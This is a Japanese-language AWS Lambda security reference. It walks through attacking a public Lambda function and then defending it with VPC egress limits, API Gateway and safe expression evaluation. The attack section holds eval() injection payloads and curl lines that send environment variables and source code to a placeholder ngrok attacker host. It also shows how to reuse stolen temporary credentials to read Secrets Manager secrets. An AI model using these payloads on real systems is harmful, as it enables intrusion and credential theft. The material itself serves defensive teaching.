# AWS Lambda セキュリティリファレンス

## Lambda関数セキュリティ概要

AWS Lambda関数は、サーバーレスアプリケーションの中核コンポーネントであり、APIリクエスト、ファイルアップロード、データベース更新などのイベントに応答して実行される。公開されたLambda関数に脆弱性があると、攻撃者は以下のような被害を引き起こす可能性がある：

- **任意コード実行**：コードインジェクション脆弱性を悪用し、Lambda実行環境で任意のコマンドを実行
- **機密データの窃取**：環境変数、ソースコード、Secrets Managerのシークレットを外部サーバーへ送出（Exfiltration）
- **権限昇格**：過剰な権限を持つIAMロールを悪用し、他のAWSリソースへアクセス

公開Lambda関数は、メンテナンスコンソールを建物の外部に露出させるようなものである。正当な管理者のみが使用する前提でも、適切に保護されていなければ、攻撃者が侵入し、システム全体を乗っ取る入口となる。

---

## 公開Lambda関数の攻撃（ch6）

### 1. 公開エンドポイントの発見と列挙

Lambda Function URLは、Lambda関数をHTTPSエンドポイントとして直接公開する機能である。認証なしで設定された場合、攻撃者はブラウザやcurlから直接アクセス可能となる。

**攻撃例：Lambda Function URLへの直接アクセス**

```bash
# URL形式
https://<generated-id>.lambda-url.<region>.on.aws/?statement=42

# レスポンス例
42
```

**S3バケットの列挙（静的サイトホスティング）**

Lambda関数と連携するS3バケットが誤って公開されている場合、攻撃者はバケット内のオブジェクトを列挙し、バックアップファイルやソースコードを発見できる。

```bash
# バケット内のオブジェクトを列挙（認証なし）
aws s3 ls s3://$BUCKET_NAME/ --no-sign-request

# 出力例
                           PRE backup/
2025-01-01 00:00:00       3257 index.html

# 再帰的に全オブジェクトを表示
aws s3 ls s3://$BUCKET_NAME/ --recursive --no-sign-request

# 出力例
2025-01-01 00:00:00        875 backup/lambda_function.py
2025-01-01 00:00:00       3257 index.html
```

**ファイルのダウンロード**

```bash
# 公開バケットからファイルをダウンロード
mkdir downloaded_files
aws s3 cp s3://$BUCKET_NAME/backup/lambda_function.py \
    ./downloaded_files/ --no-sign-request
```

---

### 2. コードインジェクション攻撃（eval()悪用等）

**脆弱なコード例**

```python
def process_statement(statement):
    output = "No statement parameter value provided"
    if statement:
        output = eval(statement)  # ❌ 危険：任意コード実行可能
    return output
```

**攻撃ペイロード例**

| 入力式 | 出力 | 説明 |
|--------|------|------|
| `1 + 1` | `2` | 正常な数式評価 |
| `__import__('os').system('id')` | `0` | シェルコマンド実行成功 |
| `__import__('subprocess').check_output('ls', shell=True)` | `b'lambda_function.py\n'` | ディレクトリ内のファイル一覧取得 |
| `__import__('subprocess').check_output('cat *.py', shell=True)` | ソースコード全文 | Lambda関数のソースコード窃取 |
| `__import__('subprocess').check_output('env', shell=True)` | 環境変数一覧 | AWSクレデンシャルを含む環境変数窃取 |

---

### 3. 機密データの外部送出（Exfiltration）

**環境変数の窃取と外部送信**

```python
# 攻撃ペイロード：環境変数を外部サーバーへPOST
__import__('os').system('curl -X POST -d "$(env)" https://<attacker-server>.ngrok-free.app')

# Base64エンコードして送信
__import__('os').system('env | base64 | curl -X POST --data-binary @- https://<attacker-server>.ngrok-free.app')
```

**ソースコードの窃取**

```python
# Lambda関数のソースコードを外部サーバーへPOST
__import__('os').system('curl -X POST --data-binary @/var/task/lambda_function.py https://<attacker-server>.ngrok-free.app')
```

---

### 4. Secrets Manager シークレットの窃取

**攻撃手順**

1. **環境変数から一時認証情報を取得**

```bash
# 環境変数に含まれる一時認証情報
AWS_ACCESS_KEY_ID=ASIA...
AWS_SECRET_ACCESS_KEY=...
AWS_SESSION_TOKEN=...
```

2. **取得した認証情報でAWS CLIプロファイルを設定**

```bash
aws configure set aws_access_key_id <KEY_ID> \
    --profile assumed-lambda-role

aws configure set aws_secret_access_key <SECRET_ACCESS_KEY> \
    --profile assumed-lambda-role

aws configure set aws_session_token <SESSION_TOKEN> \
    --profile assumed-lambda-role
```

3. **認証情報が有効か確認**

```bash
aws sts get-caller-identity --profile assumed-lambda-role

# 出力例
{
    "UserId": "...:lambda-0010",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/lambda-0010-role-xyz/lambda-0010"
}
```

4. **Secrets Managerのシークレットを列挙**

```bash
aws secretsmanager list-secrets \
    --profile assumed-lambda-role \
    --region us-east-1
```

5. **シークレット値を取得**

```bash
aws secretsmanager get-secret-value \
    --secret-id prod/lambda-secret \
    --profile assumed-lambda-role \
    --region us-east-1

# 出力例
{
    "ARN": "...",
    "Name": "prod/lambda-secret",
    "SecretString": "{\"secret1\":\"secret-value1\",\"secret2\":\"secret-value2\"}",
    ...
}
```

**防御策**

- `secretsmanager:ListSecrets` 権限を削除：Lambda関数は特定のシークレットのみ取得可能にし、全シークレットの列挙を防ぐ
- 最小権限の原則：Lambda実行ロールに必要最小限の権限のみを付与

---

## VPCによるLambda保護（ch7）

### 1. VPCアタッチメントの設定手順

**Lambda実行ロールにVPC権限を追加**

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "ec2:CreateNetworkInterface",
                "ec2:DescribeNetworkInterfaces",
                "ec2:DeleteNetworkInterface"
            ],
            "Resource": "*"
        }
    ]
}
```

**VPCの作成**

```bash
REGION=us-east-1
AZ=${REGION}a

VPC_SPECS='ResourceType=vpc,Tags=[{Key=Name,Value=NoOutboundVPC}]'

VPC_ID=$(aws ec2 create-vpc \
  --cidr-block 10.0.0.0/16 \
  --region $REGION \
  --tag-specifications $VPC_SPECS \
  --query 'Vpc.VpcId' \
  --output text)

# DNS有効化
aws ec2 modify-vpc-attribute \
  --region "$REGION" \
  --vpc-id "$VPC_ID" \
  --enable-dns-support "{\"Value\":true}"

aws ec2 modify-vpc-attribute \
  --region "$REGION" \
  --vpc-id "$VPC_ID" \
  --enable-dns-hostnames "{\"Value\":true}"
```

**プライベートサブネットの作成**

```bash
SUBNET_SPECS='ResourceType=subnet,Tags=[{Key=Name,Value=PrivateSubnet}]'

SUBNET_ID=$(aws ec2 create-subnet \
  --vpc-id $VPC_ID \
  --cidr-block 10.0.1.0/24 \
  --availability-zone $AZ \
  --tag-specifications $SUBNET_SPECS \
  --query 'Subnet.SubnetId' \
  --region $REGION \
  --output text)
```

**ルートテーブルの作成と関連付け**

```bash
RT_SPECS='ResourceType=route-table,Tags=[{Key=Name,Value=PrivateRouteTable}]'

ROUTE_TABLE_ID=$(aws ec2 create-route-table \
  --vpc-id $VPC_ID \
  --tag-specifications $RT_SPECS \
  --query 'RouteTable.RouteTableId' \
  --region $REGION \
  --output text)

aws ec2 associate-route-table \
  --route-table-id $ROUTE_TABLE_ID \
  --subnet-id $SUBNET_ID \
  --region $REGION
```

---

### 2. 制限されたアウトバウンドアクセスの設定

**Lambda用セキュリティグループの作成**

```bash
LAMBDA_SG_ID=$(aws ec2 create-security-group \
  --group-name lambda-private-sg \
  --description "SG for Lambda in private subnet" \
  --vpc-id $VPC_ID \
  --region $REGION \
  --query 'GroupId' \
  --output text)

# デフォルトのアウトバウンドルールを削除（すべての外部接続をブロック）
aws ec2 revoke-security-group-egress \
  --group-id $LAMBDA_SG_ID \
  --protocol -1 \
  --port all \
  --cidr 0.0.0.0/0 \
  --region $REGION || true
```

**VPCエンドポイント用セキュリティグループの作成**

```bash
ENDPOINT_SG_ID=$(aws ec2 create-security-group \
  --group-name endpoint-sg \
  --description "SG for VPC Endpoint" \
  --vpc-id $VPC_ID \
  --region $REGION \
  --query 'GroupId' \
  --output text)

# デフォルトのアウトバウンドルールを削除
aws ec2 revoke-security-group-egress \
  --group-id $ENDPOINT_SG_ID \
  --protocol -1 \
  --port all \
  --cidr 0.0.0.0/0 \
  --region $REGION || true

# LambdaからVPCエンドポイントへのHTTPSアクセスを許可
aws ec2 authorize-security-group-ingress \
  --group-id $ENDPOINT_SG_ID \
  --protocol tcp \
  --port 443 \
  --source-group $LAMBDA_SG_ID \
  --region $REGION

# VPCエンドポイントからのアウトバウンドHTTPSを許可
aws ec2 authorize-security-group-egress \
  --group-id $ENDPOINT_SG_ID \
  --protocol tcp \
  --port 443 \
  --cidr 0.0.0.0/0 \
  --region $REGION

# LambdaからのアウトバウンドHTTPS（VPCエンドポイント向け）を許可
aws ec2 authorize-security-group-egress \
  --group-id $LAMBDA_SG_ID \
  --protocol tcp \
  --port 443 \
  --cidr 0.0.0.0/0 \
  --region $REGION
```

**Secrets Manager用VPCエンドポイントの作成**

```bash
aws ec2 create-vpc-endpoint \
  --region "$REGION" \
  --vpc-id "$VPC_ID" \
  --vpc-endpoint-type Interface \
  --service-name "com.amazonaws.${REGION}.secretsmanager" \
  --subnet-ids "$SUBNET_ID" \
  --security-group-ids "$ENDPOINT_SG_ID" \
  --private-dns-enabled \
  --query 'VpcEndpoint.VpcEndpointId' \
  --output text
```

---

### 3. API Gateway経由のルーティング

**API Gateway REST APIの作成**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
REGION="us-east-1"
LAMBDA_NAME="lambda-0010"
API_NAME="APIGateway0010"
ROUTE_PATH="lambda"
STAGE_NAME="prod"

REST_API_ID=$(aws apigateway create-rest-api \
  --name "$API_NAME" \
  --region $REGION \
  --query 'id' --output text)
```

**リソースとメソッドの作成**

```bash
PARENT_ID=$(aws apigateway get-resources \
  --rest-api-id $REST_API_ID \
  --query "items[?path=='/'].id" --output text)

RESOURCE_ID=$(aws apigateway create-resource \
  --rest-api-id $REST_API_ID \
  --parent-id $PARENT_ID \
  --path-part $ROUTE_PATH \
  --query 'id' --output text)

# GETメソッドの設定
aws apigateway put-method \
  --rest-api-id $REST_API_ID \
  --resource-id $RESOURCE_ID \
  --http-method GET \
  --authorization-type "NONE"
```

**Lambda Proxy統合の設定**

```bash
URI_1="arn:aws:apigateway:$REGION:lambda:path"
URI_2="2015-03-31/functions/arn:aws:lambda"
URI_3="$REGION:$ACCOUNT_ID:function:$LAMBDA_NAME/invocations"
URI="$URI_1/$URI_2:$URI_3"

aws apigateway put-integration \
  --rest-api-id $REST_API_ID \
  --resource-id $RESOURCE_ID \
  --http-method GET \
  --type AWS_PROXY \
  --integration-http-method POST \
  --uri $URI
```

**APIのデプロイとLambda呼び出し権限の付与**

```bash
aws apigateway create-deployment \
  --rest-api-id $REST_API_ID \
  --stage-name $STAGE_NAME

SARN="arn:aws:execute-api:$REGION:$ACCOUNT_ID:$REST_API_ID/*/*/$ROUTE_PATH"

aws lambda add-permission \
  --function-name $LAMBDA_NAME \
  --statement-id rest-apigw-$REST_API_ID \
  --action lambda:InvokeFunction \
  --principal apigateway.amazonaws.com \
  --source-arn $SARN
```

---

### 4. VPC + Lambda構成でのコードインジェクション無効化

**攻撃試行の確認**

VPCに接続されたLambda関数で、外部へのアウトバウンド接続を伴うコードインジェクション攻撃を試みた場合：

```python
# 攻撃ペイロード
__import__('os').system('curl -X POST -d "$(env)" https://<attacker-server>.ngrok-free.app')

# 結果：タイムアウト
# CloudWatchログ例
# Status: timeout
```

**CloudWatchログ分析**

```bash
# Lambda実行ログを確認
# /aws/lambda/lambda-0010 ログストリームを参照

# タイムアウト発生例
START RequestId ...
...
SECRETS MANAGER SECRETS:
% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
0 0 0 0 0 0 0 0 --:--:-- 0:00:01 --:--:-- 0
END RequestId: ...
REPORT RequestId: ... Duration: 3000.00 ms ... Status: timeout
```

VPC設定により、外部への接続が完全にブロックされ、データのExfiltrationが防止されている。

---

## セキュアなLambdaコードの書き方

### 1. コードインジェクション対策のベストプラクティス

**❌ 危険なコード：eval()を使用**

```python
def process_statement(statement):
    output = "No statement parameter value provided"
    if statement:
        output = eval(statement)  # 任意コード実行可能
    return output
```

**✅ 安全なコード：ASTベースの制限付き評価**

```python
import ast
import operator

operators = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
    ast.Pow: operator.pow,
    ast.Mod: operator.mod,
    ast.USub: operator.neg,
}

def eval_expr(expr):
    def _eval(node):
        if isinstance(node, ast.Num):
            return node.n
        elif isinstance(node, ast.Constant):
            return node.value
        elif isinstance(node, ast.BinOp):
            return operators[type(node.op)](_eval(node.left), _eval(node.right))
        elif isinstance(node, ast.UnaryOp):
            return operators[type(node.op)](_eval(node.operand))
        else:
            raise TypeError(f"Unsupported expression: {type(node).__name__}")

    try:
        tree = ast.parse(expr, mode='eval')
        return _eval(tree.body)
    except Exception:
        return "Invalid or unsafe expression"

def process_statement(statement):
    if not statement:
        return "No statement parameter value provided"
    return eval_expr(statement)
```

**動作確認**

```python
# 安全な式は正常に評価
eval_expr("(40 - 2) * 5")  # -> 190

# 危険な式は拒否
eval_expr("__import__('os').system('id')")  # -> "Invalid or unsafe expression"
```

---

### 2. 入力バリデーションパターン

**ホワイトリスト方式の入力検証**

```python
import re

def validate_expression(expr):
    # 許可する文字のみ（数字、演算子、括弧、スペース）
    if not re.match(r'^[0-9\+\-\*\/\(\)\s\.]+$', expr):
        raise ValueError("Invalid characters in expression")
    return True

def process_statement(statement):
    if not statement:
        return "No statement parameter value provided"

    validate_expression(statement)
    return eval_expr(statement)
```

**型チェックと範囲制限**

```python
def safe_math_eval(expr, max_length=100):
    if not isinstance(expr, str):
        raise TypeError("Expression must be a string")

    if len(expr) > max_length:
        raise ValueError(f"Expression too long (max {max_length} characters)")

    validate_expression(expr)
    return eval_expr(expr)
```

---

### 3. 安全なeval代替手法

**numexprライブラリの使用**

```python
import numexpr as ne

def safe_eval_numexpr(expr):
    try:
        # numexprは数式のみを安全に評価
        result = ne.evaluate(expr)
        return float(result)
    except Exception as e:
        return f"Error: {str(e)}"

# 使用例
safe_eval_numexpr("2 + 3 * 4")  # -> 14.0
safe_eval_numexpr("__import__('os')")  # -> エラー
```

**simpleeval ライブラリの使用**

```python
from simpleeval import simple_eval

def safe_eval_simple(expr):
    try:
        # 安全な式のみ評価可能
        result = simple_eval(expr)
        return result
    except Exception as e:
        return f"Error: {str(e)}"

# 使用例
safe_eval_simple("1 + 2 ** 3")  # -> 9
safe_eval_simple("__import__('os').system('id')")  # -> エラー
```

---

## Lambda セキュリティチェックリスト

### コード実装

- [ ] `eval()`, `exec()`, `compile()` などの動的コード実行関数を使用していない
- [ ] ASTベースの制限付き評価、またはnumexpr/simpleeval等の安全なライブラリを使用
- [ ] すべての外部入力に対してホワイトリスト方式のバリデーションを実装
- [ ] 入力長の上限を設定し、DoS攻撃を防止
- [ ] ソースコード内にハードコードされた認証情報が存在しない
- [ ] 環境変数に機密情報を直接保存していない（Secrets Manager/Parameter Store使用）

### IAMとアクセス制御

- [ ] Lambda実行ロールは最小権限の原則に従っている
- [ ] `AdministratorAccess` などの過剰な権限を付与していない
- [ ] Secrets Manager へのアクセスは特定のシークレットARNに限定
- [ ] `secretsmanager:ListSecrets` 権限は削除
- [ ] IAMポリシーを定期的に監査・見直し

### ネットワークとVPC

- [ ] 外部APIアクセスが不要な場合、VPCアタッチメントでアウトバウンド通信を制限
- [ ] VPCエンドポイントを使用してAWSサービスへプライベート接続
- [ ] セキュリティグループで不要なポート・プロトコルを閉じる
- [ ] NAT Gatewayを使用する場合、必要な送信先のみ許可

### API Gateway設定

- [ ] Lambda Function URLではなくAPI Gatewayを使用（本番環境）
- [ ] 認証・認可を設定（IAM、Cognito、Lambda Authorizer等）
- [ ] スロットリング設定でDoS攻撃を防止
- [ ] CORSを厳格に設定（`Access-Control-Allow-Origin: *` を避ける）
- [ ] リソースポリシーで送信元IPやVPCを制限
- [ ] WAF統合でSQLインジェクション・XSS等を防止

### ログと監視

- [ ] CloudWatch Logsでエラー・異常を追跡
- [ ] AWS X-Rayで分散トレーシング
- [ ] CloudTrailでAPI呼び出しを監査
- [ ] GuardDutyで異常なアクティビティを検出
- [ ] Security Hubでコンプライアンス状況を一元管理
- [ ] ログはS3に長期保存し、改ざん防止（オブジェクトロック）

### 運用とデプロイ

- [ ] IaC（Terraform/CDK/SAM）でインフラ構成を管理
- [ ] CI/CDパイプラインでセキュリティスキャン（SAST/DAST）を自動実行
- [ ] 依存ライブラリの脆弱性を定期スキャン（Dependabot/Snyk等）
- [ ] Lambda関数バージョニングとエイリアスを活用
- [ ] ブルー/グリーンデプロイでリスクを最小化
- [ ] 定期的なペネトレーションテスト実施
